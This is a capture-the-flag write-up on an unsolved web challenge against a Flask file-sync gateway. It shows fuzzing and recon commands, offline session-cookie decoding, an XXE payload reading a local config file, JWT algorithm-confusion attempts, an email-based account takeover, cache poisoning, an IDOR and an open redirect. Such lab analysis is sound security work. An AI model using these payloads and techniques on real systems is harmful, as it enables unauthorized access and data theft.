# meshgate

| | |
|---|---|
| Event | The Few Chosen CTF 2026 |
| Category | web |
| Difficulty | grandpa |
| Author | skyv3il |
| Points at close | 500 |
| Solves | 0 |
| Status | unsolved |

> Enterprise file-sync gateway with corporate SSO: staff sign in locally or via a federated IdP; admins manage releases from a built-in update center. Ship the brief only.
>
> Wait 2-3 minutes ! It starts slower !

<details>
<summary><b>How far I got</b></summary>

## The measurement that reframed the whole challenge

Nobody solved this, here or anywhere, so there is no path to a flag. There is one
discrete jump in understanding, it arrived on turn 17 of 18, and it is four lines of Python
against a cookie we were already holding:

```python
import base64, zlib
payload = mg_session.lstrip(".").split(".")[0]
print(zlib.decompress(base64.urlsafe_b64decode(payload + "==")))
# {"gw_user":"za3dbd88","idp_user":"za3dbd88","oidc_state":"ITZN4A9Mu86qdH69"}
```

`mg_session` is an `itsdangerous` `URLSafeTimedSerializer` cookie, zlib-compressed, signed
and not encrypted, so it decodes offline without a key. Run the same decode after
`POST /auth/sso/attest/start` and the payload gains `attest_nonce`, `attest_round`, and
`attest_last`. Three consequences land at once. The attestation ceremony state that sixteen
turns had been attacking as a server-side HMAC lives in the client's own cookie, so forging
`attest_round: 1` satisfies `rounds_required: 1` with the token requirement absent. `gw_user` is the
entire identity, without a role, capability, or source, so forging
`gw_user: "admin"` is the admin bypass outright. And therefore the whole challenge reduces
to the Flask `SECRET_KEY`, which the support bundle's 693 environment keys do not contain.

The next turn killed that ending, and killing it is the second most useful thing in this
writeup. `/idp/jwks` on one instance reports a modulus beginning `0QVvI0OQ0uTsZlRkm0S5XkuVnPfm`
and a different instance reports `k1oGglLyPv_1feLkQYFKl0jPjMwyrNvfrtHPGkwZnZTx` under the
same `kid=meshgate-idp-2026`, so the IdP keypair is generated at process start rather than
baked into the image. A Flask secret generated the same way explains, in one stroke, why
rockyou and a 180,000-candidate thematic list both missed, why 711 attestation derivations
failed, and why 17 client-authentication shapes at `/idp/token` all returned the same
`401`. The intended solve is a logic bug rather than a secret recovery. The three
logic targets are to become `admin`, to obtain the `release-publish` capability, or to leak
the environment by some route other than the support bundle.

## What winning requires, and the test every lead has to pass

`FLAG` is in the process environment. `GET /api/support/bundle` dumps that environment and
redacts `FLAG` and `GPG_KEY` by key name, unconditionally, with its own `note` saying so.
No amount of reading endpoints wins, so the finish has to be code execution, a
file read, or an environment leak that is not the bundle.

`POST /auth/sso/federated` grants a `release-publish` capability to a service account that
presents a client-attested Corp SSO `id_token`, `POST /api/release/stage` then stages a
signed vendor release, and the challenge description says "Ship the brief only".

## Recon, in the order it ran

There is no handout, so everything here came from outside. The platform's own tooling is
broken for this event, which is worth stating once because it costs everyone twenty
minutes:

```bash
MGR=https://challenge-manager.management.ctf.thefewchosen.com
curl -s -X POST $MGR/isolated -H "Authorization: Bearer $TOK" \
  -H 'content-type: application/json' -d '{"name":"meshgate"}'
curl -s $MGR/isolated -H "Authorization: Bearer $TOK"        # read deploymentName
curl -s -X DELETE $MGR/isolated/<deploymentName> -H "Authorization: Bearer $TOK"
```

One meshgate per team, so a second POST returns 409 and a fresh instance costs you the one
you have. The base URL is plain http, since `https://` on the challenge hostname 302s back
to http, and a capture pass that forgets this gets a 302 for every single request. When
every POST starts answering `308 Permanent Redirect` to the https form while GETs still
answer, the instance has expired. On a live instance `POST /login` reaches the app, so
there is no https-forcing bug to chase.

The first real find is that `/help` is a complete API reference and is not gated, which
returns the route map for free:

```bash
curl -s "$BASE/help" | grep -oE '(/[a-z0-9/_.<>-]+)' | sort -u
```

That yields the auth routes, the in-app OIDC IdP under `/idp`, roughly forty `/api/*`
endpoints, and the admin set behind a 403. It also names the two endpoints the intended
chain runs through, plus `GET /admin/session/adopt?t=` as a console bootstrap redemption
and `/api/support/bundle` as the environment dump.

`/help` is incomplete, and finding out how incomplete took most of the event. Four methods
each produced routes that the previous ones had missed, and all four transfer:

1. Directory fuzzing, with the size filter set per prefix. The 404 body is
   instance-specific and prefix-specific, 5587 bytes on two instances and 5644 on an older
   one, with `/idp/...` 404s differing from `/auth/...` ones inside a single session, so
   the working invocation is `ffuf -mc all -fs <that number>` and never a status filter.
   This found `/search`, `/templates`, `/status`, `/analytics`, `/trash`, `/inbox`,
   `/calendar`, and `/support`.
2. The 403-versus-404 split as an existence oracle for gated routes. An existing but gated
   admin route answers 403 in 5537 bytes and a missing one answers 404 in 5654, which found
   `/admin/audit` among 2313 candidate names, with the six already-known admin routes as
   the positive control.
3. Reading the rendered GET page of every route and harvesting its `<code>` spans and
   prose. `GET /support`, authenticated, documents `GET /api/support/health`,
   `GET /api/support/echo`, and `GET /api/support/diagnostics?trace=1&probe=`, none of
   which appear in `/help` or in any wordlist. Method warning earned the hard way: the
   first pass of that sweep included `/logout` in the route list and destroyed its own
   session halfway through, so every route after it read as 401.
4. The `OPTIONS` `Allow` header of every route, which is a complete and free method census.
   That found `POST /api/billing/plan`, documented as GET only.

The first two of those, as run:

```bash
# measure the 404 size for THIS prefix on THIS instance, then filter on it
curl -s -o /dev/null -w '%{size_download}\n' "$BASE/admin/zzqq"        # 5654
ffuf -u "$BASE/admin/FUZZ" -w adminwords.txt:FUZZ -b "mg_session=$C" -mc all -fs 5654
# -> updates channels policies connectors groups retention audit
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$BASE/admin/audit"   # 403 5537
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$BASE/admin/auditz"  # 404 5654
```

`/api/support/echo` reflects the parsed request and settles a fact the ledger had wrong for
fifteen turns: `X-Forwarded-Server: traefik-lvhll` means the front proxy is traefik, and
the `Server: nginx` response header is set by the application itself. The same endpoint
shows the ingress rewriting the entire `X-Forwarded-*` family, dropping an injected
`X-Forwarded-Prefix` and replacing `X-Forwarded-For`, while a custom `X-Probe` header
survives as the control. So `TRUST_PROXY=1` is visible in the bundle and unreachable from
the public port.

## The three walls on the intended chain

Each of these is closed with a control, and each control is the part worth copying.

The `id_token` cannot be obtained. `/idp/token` requires the `meshgate-gw` client secret
and answers a uniform `401 invalid_client` across 17 shapes, including no client
authentication at all, an empty secret, a secret equal to the client id, HTTP Basic in three
forms, a partner `app_id` as the client, and the grant types `refresh_token`, `password`,
`implicit`, and RFC 8693 token exchange. The useful part is that it returns the same 401
with a deliberately bogus code, which proves client authentication runs ahead of both the
grant and the code lookup and therefore the oracle is absent. The implicit flow is absent,
since `response_type` is ignored, with ten calls returning ten distinct fresh codes
as the control. `meshgate-gw` is the only client, established by running 76 names through
the `unknown client` versus `redirect_uri not permitted` oracle, which fired on
`meshgate-gw` alone. The application never emits a JWT anywhere, from a regex scan of all 43
known endpoints.

The signature cannot be forged. `algorithms=['RS256']` is enforced, so 15 `alg:none` shapes
and 21 HS256, HS384, and HS512 tokens signed with the IdP public key in seven
representations all return `The specified alg value is not allowed`, while a two-segment
token returns `Not enough segments`, which is the control proving the header really is
parsed before the rejection. No key resolution happens either: `jku` and `x5u` pointed at a
refused port, an embedded `jwk`, `kid` traversal, `x5c`, and three `iss` values all return
`Signature verification failed` in 0.14 s, identical to the baseline latency, so it does not fetch
anything.

The attestation cannot be completed. `POST /auth/sso/attest/step` compares exactly one
field, `token`, with `hmac.compare_digest`, and the ceremony is fully unauthenticated, so
the expected value is a function of the nonce and a server secret and of nothing else. 711
derivations were excluded, covering md5, sha1, and sha256 of the nonce as text and as raw
bytes, HMAC keyed by the nonce both ways, and prefix and suffix constructions under six
candidate keys. `attest/start` rejects all parameters, tested with 51 names across JSON and
query string, with the sweep normalizing out the nonce and diffing against a live baseline
taken in the same run.

Naming the `token` field was itself the most transferable result of the event, and it came
from an oracle rather than from guessing. 380 blind field-name guesses had failed. Then:

```
POST /auth/sso/attest/step   Content-Type: application/json
{"token":"é中"}        -> HTTP 500
{"zqzq":"é中"}         -> HTTP 400, the ordinary baseline
```

`hmac.compare_digest` raises `TypeError: comparing strings with non-ASCII characters is not
supported` when handed a non-ASCII `str`, so any handler that pushes a request value into
it turns a non-ASCII value into a 500 while an unread field name stays at the normal 4xx.
One pass named the field. Three neighboring 500s in the same probe (a bare `1`, a bare
`"x"`, and `true` as the whole JSON body) pin the handler shape as
`data = request.get_json(silent=True) or request.form` followed by `data.get(...)`, because
`[]` is falsy and falls through to the form branch and therefore avoids the 500.

## The identity model, wrong twice before it was right

The gateway joins a federated login to a gateway account, and working out how took two
retractions that are worth reading in order, because the first model fit every observation
on one instance and was still false.

The first model was that the `email` field on `/idp/register` steers the gateway username
when the domain is the gateway's own `corp.meshgate.io`. Evidence on one instance: IdP user
`zz25832` with `admin@corp.meshgate.io` landed on gateway account `admin_c14a`, exactly
where IdP users named `admin`, `Admin`, `ADMIN`, and `admın` landed, while non-corp emails
were ignored for naming.

On a fresh instance that reproduces as `k973166`, not `admin_c14a`, and the model is wrong.
The correct one explains both instances: the gateway looks up an existing account by email,
signs you in as that account on a hit, and on a miss creates an account named
`normalise(idp_username)` with a four-hex collision suffix if the name is taken. On the old
instance the very first `admin`-shaped registration created `admin_c14a`, and every later
registration carrying that email was a lookup hit onto it.

Stated that way it is a confirmed account takeover primitive rather than a naming quirk.
Registering a brand new IdP identity with an email that an existing gateway account already
holds signs you in as that account, verified three times on one instance across two
domains, with the IdP username ignored on a hit.

It misses the seeded admin, and the reason is a guard rather than a normalization
gap. 31 shapes of admin's address, covering case variants, leading and trailing whitespace,
CR, LF, NUL, a trailing dot, an RFC 5321 quoted local part, a `+x` tag, a second `@x.com`,
comma and semicolon lists, NBSP, zero-width space, Cyrillic and fullwidth `a`, a dotless
`i`, the dot removed, a duplicated form field in both orders, `email[]`, and 40 trailing
spaces, each created a fresh account. The control that makes that meaningful is that the
case variants did not link to each other either, so the comparison does not fold at all.

That failure is itself an oracle. An email that remains unlinked on its second use is an
email a seeded account already owns: `d.whitaker@meshgate.corp` used twice produced two
different fresh accounts, which no other address does, while the control
`dt25327.x@x.com` linked normally on its second use. Cracking the addresses was cheap,
because `/api/directory` publishes a gravatar `avatar` that is `md5(email)`, and the full
names in the same response give the candidate local parts: `d.whitaker@meshgate.corp` for
`admin`, `j.okafor@meshgate.corp` for `jordan`, and `releasebot@meshgate.corp` for
`releasebot`. The positive control is that an account registered with the exact string
shows the identical avatar hash.

The username side has a real normalizer gap and it yields nothing. A 35-shape
collision battery shows the folder is a confusables skeleton fold rather than plain NFKC,
since it maps Cyrillic U+0430 and fullwidth forms onto Latin `a` where NFKC omits that mapping.
Non-ASCII lacking a fold is stripped, so `admin\x00x` becomes `adminx`, and an entirely
unfoldable username normalizes to the empty string and falls back to the literal account
name `user`. Every shape that folds to `admin` with a differing byte representation gets the collision
suffix, and the suffix differs per raw input, with eight different suffixes for the one
folded name, so it is either per-creation random or a keyed function of the raw name under
a per-instance key.

## The XXE refutation, which is the cleanest negative of the event

`/api/unfurl?url=` fetches a URL and returns `{title, snippet, content_type, status}`, which
looks exactly like a document parser and therefore like an XXE. It is not one, and the way
to prove that rather than assume it is to serve hostile documents from a tunnel we control
and read what comes back.

The payload and the probe, with the content type steered by the served file's extension:

```bash
cat > mg1.xml <<'X'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///app/config.py">]>
<r><title>S:&xxe;:E</title></r>
X
cat > mg0.html <<'X'
<html><head><title>UNFURL-CONTROL-OK</title></head><body>BODYMARK</body></html>
X
curl -s -b "mg_session=$C" --get "$BASE/api/unfurl" --data-urlencode "url=$CB/s/mg1.xml"
curl -s -b "mg_session=$C" --get "$BASE/api/unfurl" --data-urlencode "url=$CB/s/mg0.html"
```

Thirteen documents, each with that DOCTYPE and that title, across five content types
(`application/xml`, `text/html`, `application/xhtml+xml`, `application/x-rss+xml`, and
`image/svg+xml`), every one comes back as:

```json
{"title":"S:&xxe;:E","snippet":"]> S:&xxe;:E"}
```

The entity is returned literally, and the `]>` closing the internal subset leaks into the
snippet as body text. A tag-stripper does exactly that and an XML parser never does. A
nonexistent file gives byte-identical output, so there is no error channel to work with
either, and an external-DTD out-of-band parameter entity did not produce a fetch at the
collector. The positive control fired in the same run: `mg0.html` with a plain
`<title>UNFURL-CONTROL-OK</title>` returned
`{"title":"UNFURL-CONTROL-OK","snippet":"UNFURL-CONTROL-OK BODYMARK"}`, so the fetch, the
tunnel, and the parse path all work. Scheme is allow-listed to http and https, so `file:`
is refused with `only http(s) links can be previewed`. The script is `scratch/t18_xxe.py`,
the payloads are in `scratch/t18/`, and `artifacts/live-2026-09-06/shot-09-api-unfurl-title.png`
shows the scraped-title shape on a clean read.

## The edge cache, and a trap that produced two wrong conclusions

`/status`, `/status/banner`, and `/admin/status/health` include `X-Edge-Cache` and
`Vary: X-Meshgate-Edge-Render`. The cache key contains the path but not the query string,
not the cookie, and not the value of that header, while the application does vary its render
on the header value, which is a working unkeyed-input cache poisoning primitive: sending
`X-Meshgate-Edge-Render: 1` to `/admin/status/health` stores a banner-substituted body that
every later client then reads, whether anonymous or authenticated.

The health page self-describes as rendering a one-time console bootstrap into a
`{console_token}` banner slot inside an administrator session, with
`/admin/session/adopt?t=` as the redemption endpoint, so the branch is obvious and it was
worked for four turns. It is closed. Every context anyone can construct renders
`{console_token}` as the empty string, and the final attempt loaded the store with eleven
spoofed headers from a session registered with `groups=admins` and admin's corp email and
with `admin_console_preview` enabled, reading back
`<div class=admin-health>CT[] TS[operational]</div>`. The control is `TS[operational]`,
which proves the worker render really ran and really substituted, so `CT[]` is a genuinely
empty console token rather than a failed render.

Two traps here cost real turns and both are stated at the top of our ledger. The body
returned to the storing request is not the body written into the cache, since the storer is
handed the refusal page while a separate privileged render lands in the entry, so a reader
must read back rather than classify on the storing response. And because `/status/banner`
ignores the query string in its cache key, the first probe of a run can land on a STORE and
freeze that payload in, after which every later probe reads STALE and returns the first
payload, which is indistinguishable from a negative. Always print `X-Edge-Cache` before
interpreting a body.

One theory in this area was published to our own ledger and retracted an hour later: that
the privileged render is granted by client address and our loopback SSRF is a loopback
client. It was wrong because the unfurl fetch that appeared to produce the privileged
render returned `X-Edge-Cache: HIT` and was reading a stored entry. The retraction is left
in the notes on purpose.

## Dead ends, each with its control

- No privileged visitor acts on our content. Markers planted in eleven storable surfaces,
  read back nine minutes later: `/api/activity` lists only our own actor, with inbox,
  notifications, and sessions empty. The control is that `/api/activity` records every one
  of our own writes with an actor and a timestamp, so the feed is live. Honest limit: this
  rules out a visitor we can observe, and a reader that never writes an activity row would
  be invisible to it.
- No background revalidation, from 16 samples of `/admin/status/health` over six minutes
  reading `X-Edge-Cache: MISS` every time.
- No route open internally but closed publicly, from 36 routes read through the
  `/thumbnail?src=` status oracle on loopback and then on the public port. Loopback is
  always more restricted, because it lacks a cookie, and only ports 5000 and 8001 are
  open out of eighteen probed.
- No admin-gate bypass. Twelve path shapes and three override headers all stay 403,
  `GET`, `POST`, and `HEAD` are gated, while `PUT`, `PATCH`, `DELETE`, `PROPFIND`, and an
  invented method all 405 at the router. `OPTIONS` is 200 with a zero-byte body, which is
  Werkzeug's automatic handler and never calls a view, and the control is that it is 200
  with zero bytes even on `/admin/status`, which 404s for every other method.
- No feature-flag lever. The namespace is exactly five real flags against 80 rejected
  candidates, the control being that all five accept and accumulate in `overrides`, and
  turning every one on changes 0 of 22 surfaces.
- No entitlement lever. `POST /api/billing/plan` on a workspace we own grants
  `admin_console` and `audit_export`, and with both held the seven admin pages, both SCIM
  endpoints, `/api/release/stage`, and `/admin/session/adopt` are byte-identical to before.
  No gate on this app consults an entitlement.
- No scope lever, though the field name matters. `POST /api/tokens` with the plural form
  field `scopes` mints any scope verbatim, including `release-publish` and `*`, where an
  earlier negative had used singular `scope` in JSON. `/api/release/stage` checks a session
  capability rather than the token scope, so it stays 403.
- `releasebot` can be half-impersonated for nothing. The seeded IdP lacks a `releasebot`
  user, so the name is free, and the gateway JIT-provisions a suffixed account with
  `releasebot@meshgate.corp` that is still `role: user`.
- A real IDOR lacking a prize. `/api/reports/<id>` ids are sequential from `rpt-1001` and omit an
  ownership check, so a plain user reads admin's and jordan's reports, and the content is
  the directory roster and node usage. The control is that `rpt-995` through `rpt-1000` and
  `rpt-1007` upward return `no such report`.
- A real open redirect lacking a victim to send through it. `/idp/login?next=` 302s to
  `https://example.com/x`, to `//example.com/x`, and even to
  `http://127.0.0.1:8001/api/support/bundle` after a successful login, and the
  no-privileged-visitor result means a victim is absent.
- No file surface at all. Nine file-creation routes are 404, `/import` skips file
  record creation, so `/api/exports` manifests have nothing attacker-named to smuggle, and
  `entry=../app.py` and five siblings return `no such entry in manifest` with the allowlist
  echoed against a `manifest.json` control that works.

## Reusable lessons

- A non-ASCII value is a field-read oracle wherever `hmac.compare_digest` might be, as
  described above.
- 403 versus 404 is an existence oracle for gated routes.
- Encoding is per endpoint and lacks a pattern. `/api/partner-apps`, `/api/webhooks`,
  `/api/folders`, and `/api/workspaces` are form-only, `/auth/sso/attest/step` is JSON-only,
  and `/auth/sso/federated` takes either, so re-test every JSON 400 with `data=` before
  recording a negative. Two of our own negatives were struck for exactly this.
- Before trusting a zero from a generated wordlist, grep the list for a value you already
  know is valid. Our generator produced two false zeros and the second was caught this way.
- A cracker should contain a planted answer. `scratch/t17_crack.py` injects a known secret
  into every candidate stream and refuses to report a negative unless the plant was found,
  so a report of "rockyou missed" is a measurement of the stream and not a hope about it.
- Operationally, this Flask dev server collapses under two concurrent clients, which cost
  two runs; loading a saved `mg_session` with `cookies.set()` sends two cookies and breaks
  the ceremony, which voided one result; and `/logout` in a sweep list ends the sweep.

## What a fresh pair of eyes should take first

1. The `attest/step` secret. One accepted `(nonce, token)` pair makes it brute-forceable
   offline, so a single leaked token is worth more than more guessing.
2. `/admin/audit`, found at the very end and never read. It is gated, and an audit log is
   the surface that would name a privileged actor if one exists.
3. The four POST-capable admin routes. `/admin/updates` is the only lead shaped like code
   execution, and the support bundle reports `update_signature_required` as `false`.
4. Whether `/auth/sso/federated` is scenery at all. It is documented on a page not linked from
   anywhere, which usually means intended, and three independent attacks say it is
   unreachable from outside the process.

`artifacts/CAPTURE-INDEX.md` indexes nine post-contest screenshots and roughly 35 raw HTTP
transcripts, each holding the request line, the status, every response header, and the body,
so a reader can check any claim above rather than take it on trust.

</details>
